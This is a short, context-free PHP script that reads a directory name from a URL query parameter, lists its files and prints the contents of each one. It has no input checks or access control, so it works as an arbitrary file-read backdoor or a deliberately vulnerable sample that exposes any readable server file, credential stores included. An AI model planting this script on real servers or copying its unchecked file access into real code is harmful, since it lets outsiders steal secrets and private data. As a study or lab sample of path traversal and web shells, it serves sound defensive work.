<?php


if ($handle = opendir($_GET['dir'])) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

          echo "$entry\n";
          readfile($_GET['dir']."/".$entry);
        }
    }

    closedir($handle);
}


?>
